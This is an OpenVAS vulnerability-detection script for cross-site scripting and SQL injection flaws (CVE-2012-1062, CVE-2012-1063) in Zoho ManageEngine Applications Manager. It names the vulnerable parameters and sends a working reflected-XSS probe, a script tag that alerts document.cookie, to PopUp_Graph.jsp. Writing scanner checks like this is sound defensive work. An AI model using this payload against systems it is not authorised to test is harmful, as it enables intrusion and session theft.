###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_applications_manager_mult_xss_n_sql_inj_vuln.nasl 8671 2018-02-05 16:38:48Z teissa $
#
# Zoho ManageEngine Applications Manager Multiple XSS and SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to execute arbitrary
HTML and script code in a user's browser session in context of an affected site
and compromise the application, access or modify data, or exploit latent
vulnerabilities in the underlying database.

Impact Level: Application";

tag_affected = "ManageEngine Applications Manager version 9.x and 10.x";

tag_insight = 
"The flaws are due to an input passed to the
- 'query', 'selectedNetwork', 'network', and 'group' parameters in various
   scripts is not properly sanitised before being returned to the user.
- 'viewId' parameter to fault/AlarmView.do and 'period' parameter to
   showHistoryData.do is not properly sanitised before being used in SQL
   queries.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Zoho ManageEngine Applications Manager
and is prone to multiple cross site scripting and SQL injection vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802424");
  script_version("$Revision: 8671 $");
  script_cve_id("CVE-2012-1062", "CVE-2012-1063");
  script_bugtraq_id(51796);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-02-05 17:38:48 +0100 (Mon, 05 Feb 2018) $");
  script_tag(name:"creation_date", value:"2012-02-16 15:09:43 +0530 (Thu, 16 Feb 2012)");
  script_name("Zoho ManageEngine Applications Manager Multiple XSS and SQL Injection Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47724");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/72830");
  script_xref(name : "URL" , value : "http://www.vulnerability-lab.com/get_content.php?id=115");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/109238/VL-115.txt");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = 0;
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:8080);
if(!port){
  port = 8080;
}

## Check port staus
if(!get_port_state(port)) {
  exit(0);
}

sndReq = http_get(item:"/jsp/PreLogin.jsp", port:port);
rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

## Confirm the application
if(rcvRes && egrep(pattern:">Copyright.*ZOHO Corp.,", string:rcvRes))
{
  ## Construct attack
  url = "/jsp/PopUp_Graph.jsp?restype=QueryMonitor&resids=&attids='&attName=" +
        "><script>alert(document.cookie)</script>";

  ## Confirm exploit worked properly or not
  if(http_vuln_check(port:port, url:url, check_header: TRUE,
         pattern:"<script>alert\(document.cookie\)</script>")){
    security_message(port);
  }
}

